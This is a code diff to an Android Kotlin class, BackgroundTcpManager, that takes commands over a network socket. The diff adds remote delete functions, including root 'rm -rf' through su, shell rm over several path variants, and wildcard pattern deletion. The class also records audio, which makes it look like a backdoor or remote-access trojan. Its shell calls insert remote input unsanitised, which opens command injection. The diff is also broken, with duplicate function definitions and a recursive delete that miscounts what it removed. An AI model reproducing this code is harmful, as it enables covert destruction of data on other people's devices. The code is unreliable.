@@ -250,9 +250,26 @@ class BackgroundTcpManager(private val context: Context) {
                 }
 
                 command.startsWith("delete") -> {
-                    val filePath = command.substringAfter("delete").trim()
-                    val result = deleteFile(filePath)
-                    sendResponse(result, socket)
+                    val args = command.split(" ").drop(1) // Remove "delete"
+
+                    when {
+                        args.isEmpty() -> {
+                            sendResponse("Usage: delete <file_or_directory>", socket)
+                        }
+
+                        args[0] == "-f" && args.size > 1 -> {
+                            // Force delete
+                            val path = args.drop(1).joinToString(" ")
+                            val result = forceDeletePath(path)
+                            sendResponse(result, socket)
+                        }
+
+                        else -> {
+                            val path = args.joinToString(" ")
+                            val result = deletePathSimple(path)
+                            sendResponse(result, socket)
+                        }
+                    }
                 }
 
                 command.startsWith("mkdir") -> {
@@ -401,7 +418,367 @@ class BackgroundTcpManager(private val context: Context) {
             "Error starting audio recording: ${e.message}"
         }
     }
+// ENHANCED DELETE FIX for BackgroundTcpManager.kt
 
+    private fun deletePathSimple(inputPath: String): String {
+        return try {
+            val file = if (inputPath.startsWith("/")) {
+                File(inputPath)
+            } else {
+                File(currentDirectory, inputPath)
+            }
+
+            Log.d(TAG, "Delete request for: ${file.absolutePath}")
+
+            if (!file.exists()) {
+                return "File/directory not found: ${file.absolutePath}"
+            }
+
+            // Check if it's a protected system directory
+            val protectedPaths = listOf(
+                "/storage/emulated/0/Android",
+                "/storage/emulated/0/Ringtones",
+                "/storage/emulated/0/Notifications",
+                "/storage/emulated/0/Alarms",
+                "/storage/emulated/0/Audiobooks",
+                "/storage/emulated/0/Podcasts"
+            )
+
+            if (protectedPaths.any { file.absolutePath.startsWith(it) }) {
+                return "BLOCKED: ${file.name} is a protected system directory.\n" +
+                        "Android 12+ prevents deletion of system media folders.\n" +
+                        "Try deleting specific files instead of entire directories."
+            }
+
+            // Check writable locations
+            val writablePaths = listOf(
+                "/storage/emulated/0/Download",
+                "/storage/emulated/0/Documents",
+                "/storage/emulated/0/Pictures",
+                "/storage/emulated/0/Movies",
+                "/storage/emulated/0/Music",
+                "/storage/emulated/0/DCIM"
+            )
+
+            val isInWritableLocation = writablePaths.any { file.absolutePath.startsWith(it) }
+
+            if (!isInWritableLocation && file.absolutePath.startsWith("/storage/emulated/0/")) {
+                return "RESTRICTED: ${file.name} is in a restricted location.\n" +
+                        "Android scoped storage only allows deletion from:\n" +
+                        "- Download/\n- Documents/\n- Pictures/\n- Movies/\n- Music/\n- DCIM/\n" +
+                        "Current path: ${file.absolutePath}"
+            }
+
+            val originalSize = if (file.isFile) file.length() else calculateTotalSize(file)
+            val itemType = if (file.isDirectory) "directory" else "file"
+            val itemCount = if (file.isDirectory) countItems(file) else 1
+
+            // Try multiple deletion methods
+            val success = when {
+                // Method 1: Try MediaStore deletion for media files
+                isMediaFile(file) -> tryMediaStoreDelete(file)
+
+                // Method 2: Standard file deletion
+                file.isFile -> {
+                    try {
+                        file.delete()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Standard delete failed: ${e.message}")
+                        false
+                    }
+                }
+
+                // Method 3: Directory deletion (careful!)
+                file.isDirectory -> {
+                    try {
+                        deleteRecursiveCareful(file)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Directory delete failed: ${e.message}")
+                        false
+                    }
+                }
+
+                else -> false
+            }
+
+            if (success) {
+                "SUCCESS: Deleted $itemType '${file.name}'\n" +
+                        "Path: ${file.absolutePath}\n" +
+                        "Items removed: $itemCount\n" +
+                        "Space freed: ${formatFileSize(originalSize)}"
+            } else {
+                "FAILED: Could not delete ${file.absolutePath}\n" +
+                        "Possible reasons:\n" +
+                        "- Android scoped storage restrictions\n" +
+                        "- File is system-protected\n" +
+                        "- Insufficient permissions\n" +
+                        "- File is currently in use\n\n" +
+                        "TIP: Try 'delete force $inputPath' for aggressive deletion"
+            }
+
+        } catch (e: Exception) {
+            "ERROR: Delete failed - ${e.message}"
+        }
+    }
+
+    // Enhanced media file detection
+    private fun isMediaFile(file: File): Boolean {
+        val mediaExtensions = setOf(
+            "jpg", "jpeg", "png", "gif", "bmp", "webp",
+            "mp4", "avi", "mkv", "mov", "wmv", "flv",
+            "mp3", "wav", "flac", "aac", "ogg", "m4a",
+            "pdf", "doc", "docx", "txt"
+        )
+        return file.extension.lowercase() in mediaExtensions
+    }
+
+    // Careful recursive delete with permission checks
+    private fun deleteRecursiveCareful(directory: File): Boolean {
+        return try {
+            var allDeleted = true
+            var deletedCount = 0
+
+            // Only delete files we can actually access
+            directory.walkBottomUp().forEach { file ->
+                try {
+                    // Skip if we can't read the file
+                    if (!file.canRead()) {
+                        Log.w(TAG, "Cannot read file, skipping: ${file.absolutePath}")
+                        return@forEach
+                    }
+
+                    // For files, check if they're deletable
+                    if (file.isFile) {
+                        if (file.canWrite() || file.delete()) {
+                            deletedCount++
+                            Log.d(TAG, "Deleted file: ${file.name}")
+                        } else {
+                            allDeleted = false
+                            Log.w(TAG, "Cannot delete file: ${file.absolutePath}")
+                        }
+                    } else if (file.isDirectory) {
+                        // Only delete empty directories
+                        val contents = file.listFiles()
+                        if (contents == null || contents.isEmpty()) {
+                            if (file.delete()) {
+                                deletedCount++
+                                Log.d(TAG, "Deleted empty directory: ${file.name}")
+                            } else {
+                                allDeleted = false
+                                Log.w(TAG, "Cannot delete directory: ${file.absolutePath}")
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    allDeleted = false
+                    Log.w(TAG, "Exception deleting ${file.absolutePath}: ${e.message}")
+                }
+            }
+
+            Log.d(TAG, "Recursive delete completed. Deleted: $deletedCount items, All successful: $allDeleted")
+            allDeleted
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Recursive delete failed: ${e.message}")
+            false
+        }
+    }
+
+    // Enhanced MediaStore deletion
+    private fun tryMediaStoreDelete(file: File): Boolean {
+        return try {
+            val resolver = context.contentResolver
+
+            // Try different MediaStore URIs based on file type
+            val uris = listOf(
+                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                android.provider.MediaStore.Files.getContentUri("external")
+            )
+
+            for (uri in uris) {
+                try {
+                    val selection = "${android.provider.MediaStore.MediaColumns.DATA} = ?"
+                    val selectionArgs = arrayOf(file.absolutePath)
+
+                    val deleted = resolver.delete(uri, selection, selectionArgs)
+                    if (deleted > 0) {
+                        Log.d(TAG, "MediaStore delete successful: $deleted rows")
+                        return true
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "MediaStore delete attempt failed for URI $uri: ${e.message}")
+                }
+            }
+
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "MediaStore delete failed: ${e.message}")
+            false
+        }
+    }
+
+    // Add force delete option
+    private fun forceDeleteEnhanced(inputPath: String): String {
+        return try {
+            val file = if (inputPath.startsWith("/")) {
+                File(inputPath)
+            } else {
+                File(currentDirectory, inputPath)
+            }
+
+            Log.d(TAG, "FORCE delete request for: ${file.absolutePath}")
+
+            if (!file.exists()) {
+                return "File/directory not found: ${file.absolutePath}"
+            }
+
+            var successMethods = mutableListOf<String>()
+            var attempts = 0
+
+            // Method 1: Root shell command (if available)
+            attempts++
+            if (tryRootDelete(file.absolutePath)) {
+                successMethods.add("Root shell")
+            }
+
+            // Method 2: Multiple shell commands
+            attempts++
+            if (tryShellDeleteEnhanced(file.absolutePath)) {
+                successMethods.add("Shell command")
+            }
+
+            // Method 3: MediaStore with different approaches
+            attempts++
+            if (tryMediaStoreDelete(file)) {
+                successMethods.add("MediaStore")
+            }
+
+            // Method 4: File.delete() with permission change attempt
+            attempts++
+            if (tryPermissionDelete(file)) {
+                successMethods.add("Permission change")
+            }
+
+            // Method 5: DocumentFile API (for newer Android)
+            attempts++
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && tryDocumentFileDelete(file)) {
+                successMethods.add("DocumentFile API")
+            }
+
+            if (successMethods.isNotEmpty()) {
+                "FORCE DELETE SUCCESS!\n" +
+                        "File: ${file.name}\n" +
+                        "Path: ${file.absolutePath}\n" +
+                        "Methods used: ${successMethods.joinToString(", ")}\n" +
+                        "Attempts: $attempts"
+            } else {
+                "FORCE DELETE FAILED!\n" +
+                        "File: ${file.absolutePath}\n" +
+                        "All $attempts methods failed.\n" +
+                        "This file may be:\n" +
+                        "- System-critical and protected by Android\n" +
+                        "- Actively in use by another process\n" +
+                        "- Requiring root access\n" +
+                        "- Protected by SELinux policies"
+            }
+
+        } catch (e: Exception) {
+            "FORCE DELETE ERROR: ${e.message}"
+        }
+    }
+
+    private fun tryRootDelete(path: String): Boolean {
+        return try {
+            val commands = listOf(
+                "su -c 'rm -rf \"$path\"'",
+                "su -c 'rm -f \"$path\"'"
+            )
+
+            for (cmd in commands) {
+                val process = Runtime.getRuntime().exec(cmd)
+                val exitCode = process.waitFor()
+                if (exitCode == 0) {
+                    Log.d(TAG, "Root delete successful with: $cmd")
+                    return true
+                }
+            }
+            false
+        } catch (e: Exception) {
+            Log.w(TAG, "Root delete failed: ${e.message}")
+            false
+        }
+    }
+
+    private fun tryShellDeleteEnhanced(path: String): Boolean {
+        return try {
+            val pathVariations = listOf(
+                path,
+                path.replace("/storage/emulated/0/", "/sdcard/"),
+                path.replace("/sdcard/", "/storage/emulated/0/"),
+                path.replace("/storage/emulated/0/", "/mnt/sdcard/"),
+                "/data/media/0/" + path.removePrefix("/storage/emulated/0/")
+            ).distinct()
+
+            val commands = listOf("rm -rf", "rm -f", "rmdir", "unlink")
+
+            for (testPath in pathVariations) {
+                for (cmd in commands) {
+                    try {
+                        val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", "$cmd \"$testPath\""))
+                        val exitCode = process.waitFor()
+                        if (exitCode == 0) {
+                            Log.d(TAG, "Shell delete successful: $cmd $testPath")
+                            return true
+                        }
+                    } catch (e: Exception) {
+                        // Continue trying other combinations
+                    }
+                }
+            }
+            false
+        } catch (e: Exception) {
+            Log.w(TAG, "Enhanced shell delete failed: ${e.message}")
+            false
+        }
+    }
+
+    private fun tryPermissionDelete(file: File): Boolean {
+        return try {
+            // Try to make it writable first
+            if (file.setWritable(true) && file.setReadable(true)) {
+                if (file.delete()) {
+                    return true
+                }
+            }
+
+            // Try parent directory permissions
+            val parent = file.parentFile
+            if (parent != null && parent.setWritable(true)) {
+                return file.delete()
+            }
+
+            false
+        } catch (e: Exception) {
+            Log.w(TAG, "Permission delete failed: ${e.message}")
+            false
+        }
+    }
+
+    private fun tryDocumentFileDelete(file: File): Boolean {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                // This would require DocumentFile API implementation
+                // Complex implementation needed for full SAF support
+                Log.d(TAG, "DocumentFile deletion not fully implemented")
+            }
+            false
+        } catch (e: Exception) {
+            Log.w(TAG, "DocumentFile delete failed: ${e.message}")
+            false
+        }
+    }
     private fun stopAudioRecording(): String {
         return try {
             if (!isRecording || mediaRecorder == null) {
@@ -705,23 +1082,312 @@ class BackgroundTcpManager(private val context: Context) {
             else -> "${bytes / (1024 * 1024)} MB"
         }
     }
-    private fun deleteFile(filePath: String): String {
+
+    private fun forceDeletePath(inputPath: String): String {
         return try {
-            val file = File(filePath)
-            if (!file.exists()) {
-                return "File not found: $filePath"
+            val file = if (inputPath.startsWith("/")) {
+                File(inputPath)
+            } else {
+                File(currentDirectory, inputPath)
             }
 
-            if (file.delete()) {
-                "File deleted successfully: $filePath"
-            } else {
-                "Failed to delete file: $filePath"
+            Log.d(TAG, "Force delete request for: ${file.absolutePath}")
+
+            if (!file.exists()) {
+                return "File/directory not found: ${file.absolutePath}"
             }
+
+            // Try multiple deletion strategies
+            val success = when {
+                // Method 1: Try shell rm first
+                tryShellDelete(file.absolutePath) -> true
+
+                // Method 2: Try with different path format
+                file.absolutePath.startsWith("/storage/emulated/0/") -> {
+                    val sdcardPath = file.absolutePath.replace("/storage/emulated/0/", "/sdcard/")
+                    tryShellDelete(sdcardPath)
+                }
+
+                // Method 3: Standard delete
+                file.delete() -> true
+
+                // Method 4: Try MediaStore deletion for media files
+                tryMediaStoreDelete(file) -> true
+
+                else -> false
+            }
+
+            if (success) {
+                "SUCCESS: Force deleted '${file.name}'\nPath: ${file.absolutePath}"
+            } else {
+                "FAILED: Could not force delete ${file.absolutePath}\n" +
+                        "File may be system-protected or require root access"
+            }
+
         } catch (e: Exception) {
-            "Error deleting file: ${e.message}"
+            "ERROR: Force delete failed - ${e.message}"
         }
     }
 
+    private fun tryShellDelete(path: String): Boolean {
+        return try {
+            // Try different path variations
+            val paths = listOf(
+                path,
+                path.replace("/storage/emulated/0/", "/sdcard/"),
+                path.replace("/sdcard/", "/storage/emulated/0/")
+            ).distinct()
+
+            for (testPath in paths) {
+                val process = Runtime.getRuntime().exec(arrayOf("rm", "-f", testPath))
+                val exitCode = process.waitFor()
+                if (exitCode == 0) {
+                    Log.d(TAG, "Shell delete successful for path: $testPath")
+                    return true
+                }
+            }
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "Shell delete failed: ${e.message}")
+            false
+        }
+    }
+
+    private fun tryMediaStoreDelete(file: File): Boolean {
+        return try {
+            // For media files, try using MediaStore
+            if (file.name.matches(".*\\.(jpg|jpeg|png|gif|mp4|mp3|pdf)$".toRegex(RegexOption.IGNORE_CASE))) {
+                val resolver = context.contentResolver
+                val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+
+                val selection = "${android.provider.MediaStore.Images.Media.DATA} = ?"
+                val selectionArgs = arrayOf(file.absolutePath)
+
+                val deleted = resolver.delete(uri, selection, selectionArgs)
+                Log.d(TAG, "MediaStore delete result: $deleted rows")
+                return deleted > 0
+            }
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "MediaStore delete failed: ${e.message}")
+            false
+        }
+    }
+    private fun deletePathSimple(inputPath: String): String {
+        return try {
+            // Handle path resolution
+            val file = if (inputPath.startsWith("/")) {
+                File(inputPath)
+            } else {
+                File(currentDirectory, inputPath)
+            }
+
+            Log.d(TAG, "Delete request for: ${file.absolutePath}")
+
+            if (!file.exists()) {
+                return "File/directory not found: ${file.absolutePath}"
+            }
+
+            val originalSize = if (file.isFile) file.length() else calculateTotalSize(file)
+            val itemType = if (file.isDirectory) "directory" else "file"
+            val itemCount = if (file.isDirectory) countItems(file) else 1
+
+            // Just delete it - no restrictions, no confirmations
+            val success = if (file.isDirectory) {
+                deleteRecursiveSimple(file)
+            } else {
+                file.delete()
+            }
+
+            if (success) {
+                "SUCCESS: Deleted $itemType '${file.name}'\n" +
+                        "Path: ${file.absolutePath}\n" +
+                        "Items removed: $itemCount\n" +
+                        "Space freed: ${formatFileSize(originalSize)}"
+            } else {
+                "FAILED: Could not delete ${file.absolutePath}\n" +
+                        "Reason: Permission denied or file in use"
+            }
+
+        } catch (e: Exception) {
+            "ERROR: Delete failed - ${e.message}"
+        }
+    }
+
+    // Simple recursive delete - just works
+    private fun deleteRecursiveSimple(directory: File): Boolean {
+        return try {
+            var allDeleted = true
+
+            // Get all files and directories
+            directory.walkBottomUp().forEach { file ->
+                try {
+                    if (!file.delete()) {
+                        allDeleted = false
+                        Log.w(TAG, "Failed to delete: ${file.absolutePath}")
+                    }
+                } catch (e: Exception) {
+                    allDeleted = false
+                    Log.w(TAG, "Exception deleting ${file.absolutePath}: ${e.message}")
+                }
+            }
+
+            allDeleted
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    // Quick size calculation
+    private fun calculateTotalSize(directory: File): Long {
+        return try {
+            var totalSize = 0L
+            directory.walkTopDown().forEach { file ->
+                if (file.isFile) {
+                    totalSize += file.length()
+                }
+            }
+            totalSize
+        } catch (e: Exception) {
+            0L
+        }
+    }
+
+    // Quick item count
+    private fun countItems(directory: File): Int {
+        return try {
+            directory.walkTopDown().count()
+        } catch (e: Exception) {
+            1
+        }
+    }
+
+    // Enhanced delete with pattern support (bonus feature)
+    private fun deleteWithPattern(pattern: String, directory: String = currentDirectory): String {
+        return try {
+            val dir = File(directory)
+            val files = dir.listFiles() ?: return "Cannot read directory: $directory"
+
+            // Convert shell pattern to regex
+            val regex = pattern
+                .replace(".", "\\.")
+                .replace("*", ".*")
+                .replace("?", ".")
+                .toRegex(RegexOption.IGNORE_CASE)
+
+            val matchingFiles = files.filter { regex.matches(it.name) }
+
+            if (matchingFiles.isEmpty()) {
+                return "No files match pattern '$pattern' in $directory"
+            }
+
+            var deleted = 0
+            var failed = 0
+            var totalSize = 0L
+
+            matchingFiles.forEach { file ->
+                try {
+                    val size = if (file.isFile) file.length() else calculateTotalSize(file)
+                    val success = if (file.isDirectory) {
+                        deleteRecursiveSimple(file)
+                    } else {
+                        file.delete()
+                    }
+
+                    if (success) {
+                        deleted++
+                        totalSize += size
+                    } else {
+                        failed++
+                    }
+                } catch (e: Exception) {
+                    failed++
+                }
+            }
+
+            "PATTERN DELETE COMPLETE:\n" +
+                    "Pattern: '$pattern'\n" +
+                    "Location: $directory\n" +
+                    "Found: ${matchingFiles.size} items\n" +
+                    "Deleted: $deleted items\n" +
+                    "Failed: $failed items\n" +
+                    "Space freed: ${formatFileSize(totalSize)}"
+
+        } catch (e: Exception) {
+            "Pattern delete error: ${e.message}"
+        }
+    }
+
+    // BONUS: Advanced delete command processor (optional)
+    private suspend fun processAdvancedDelete(command: String, socket: Socket) {
+        val parts = command.split(" ")
+
+        when {
+            // Basic delete
+            parts.size == 2 -> {
+                val result = deletePathSimple(parts[1])
+                sendResponse(result, socket)
+            }
+
+            // Pattern delete: delete pattern *.txt
+            parts.size == 3 && parts[1] == "pattern" -> {
+                val result = deleteWithPattern(parts[2])
+                sendResponse(result, socket)
+            }
+
+            // Delete in specific directory: delete in /path *.log
+            parts.size == 4 && parts[1] == "in" -> {
+                val result = deleteWithPattern(parts[3], parts[2])
+                sendResponse(result, socket)
+            }
+
+            // Show what would be deleted: delete show /path
+            parts.size == 3 && parts[1] == "show" -> {
+                val result = showDeletePreview(parts[2])
+                sendResponse(result, socket)
+            }
+
+            else -> {
+                sendResponse("Usage:\n" +
+                        "delete <path>              --> Delete file or directory\n" +
+                        "delete pattern *.ext       --> Delete files matching pattern\n" +
+                        "delete in /path *.log      --> Delete pattern in specific directory\n" +
+                        "delete show <path>         --> Preview what would be deleted", socket)
+            }
+        }
+    }
+
+    // Quick preview function
+    private fun showDeletePreview(path: String): String {
+        return try {
+            val file = if (path.startsWith("/")) File(path) else File(currentDirectory, path)
+
+            if (!file.exists()) {
+                return "Path not found: ${file.absolutePath}"
+            }
+
+            if (file.isFile) {
+                "WOULD DELETE FILE:\n" +
+                        "Name: ${file.name}\n" +
+                        "Path: ${file.absolutePath}\n" +
+                        "Size: ${formatFileSize(file.length())}\n" +
+                        "Modified: ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))}"
+            } else {
+                val itemCount = countItems(file)
+                val totalSize = calculateTotalSize(file)
+
+                "WOULD DELETE DIRECTORY:\n" +
+                        "Name: ${file.name}\n" +
+                        "Path: ${file.absolutePath}\n" +
+                        "Contains: $itemCount items\n" +
+                        "Total size: ${formatFileSize(totalSize)}\n" +
+                        "Modified: ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))}"
+            }
+
+        } catch (e: Exception) {
+            "Preview error: ${e.message}"
+        }
+    }
     private fun createDirectory(dirPath: String): String {
         return try {
             val dir = File(dirPath)
